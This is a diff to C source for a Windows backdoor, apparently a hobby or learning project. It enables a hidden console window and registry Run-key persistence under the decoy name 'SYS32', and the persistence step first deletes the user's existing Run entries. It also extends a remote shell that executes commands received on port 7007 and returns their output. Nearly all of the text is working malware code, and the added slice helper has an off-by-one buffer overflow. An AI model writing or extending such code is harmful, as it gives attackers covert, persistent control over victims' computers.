@@ -4,19 +4,22 @@
 #include <windows.h>
 #include <windowsx.h>
 #include <winuser.h>
+#include <unistd.h> 
+
 
 
 #define bzero(buffer, size) memset(buffer, 0, size)
 
 
 void Shell(int sock);
-// void persistence();
-// void hideWINDOW();
-
+void persistence();
+void hideWINDOW();
+char *slice(char *ch, int from, int to);
 
 int main(){
 
-    //hideWINDOW();
+    hideWINDOW();
+    persistence();
 
     struct sockaddr_in ServerAdd;
     unsigned short Port = 7007;
@@ -24,7 +27,7 @@ int main(){
 
     WSADATA wsa;
 	
-	if (WSAStartup(MAKEWORD(2,0), &wsa) != 0)
+	if (WSAStartup(MAKEWORD(2,0), &wsa))
 	{
 		return 1;
 	}
@@ -51,6 +54,39 @@ int main(){
 
 
 
+
+
+
+
+void persistence(){
+    int delPER = system("reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /f");
+    int addPER = system("reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /t REG_SZ /v SYS32 /d \%userprofile\%\\documents\\zdo\\backdoor\\c\\backdoor.exe");
+}
+
+
+void hideWINDOW(){
+    HWND hide;
+    AllocConsole();
+    hide = FindWindow("ConsoleWindowClass", NULL);
+    ShowWindow(hide, 0);
+}
+
+
+
+char *slice(char *ch, int from, int to){
+    int diff = to-from;
+    char *sliced = malloc(diff);
+    int i;
+    for (i=from; i<to; i++){
+        *(sliced+i-from) = ch[i];
+    }
+    *(sliced+i-from) = '\0';
+    return sliced;
+}
+
+
+
+
 void Shell(int sock){
 
     char RecvCMD[1024];
@@ -64,34 +100,32 @@ void Shell(int sock){
 
         recv(sock, RecvCMD, sizeof(RecvCMD), 0);
 
-        if (!strcmp(RecvCMD, "quit")){
+        if (!strcmp(RecvCMD, "quit")){  
             WSACleanup();
             closesocket(sock);
             break;
         }
 
-        FILE *fd;
-        fd = _popen(RecvCMD, "r");
-
-        while (fgets(container, sizeof(container), fd)){
-            strcat(SendCMD, container);
+        if (!strcmp(slice(RecvCMD, 0, 3), "cd ")){
+            int dir = chdir(slice(RecvCMD, 3, strlen(RecvCMD)));
+            if (dir == -1){
+                strcat(SendCMD, "\n[!] The system cannot find the path specified.\n");
+            }
+            else{
+                strcat(SendCMD, "\n[+] Directory Changed.\n");
+            }
         }
-        
+
+        else{
+            FILE *fd;
+            fd = popen(RecvCMD, "r");
+
+            while (fgets(container, sizeof(container), fd)){
+                strcat(SendCMD, container);
+            }
+            pclose(fd);
+        }
+
         send(sock, SendCMD, sizeof(SendCMD), 0);
     }
 }
-
-
-
-// void persistence(){
-//     int delPER = system("reg delete /f \"HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENT VERSION\\RUN\"");
-//     int addPER = system("reg add \"HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENT VERSION\\RUN\" /t REG_SZ /v SYS32")
-// }
-
-
-// void hideWINDOW(){
-//     HWND hide;
-//     AllocConsole();
-//     hide = FindWindow("ConsoleWindowClass", NULL);
-//     ShowWindow(hide, 0);
-// }
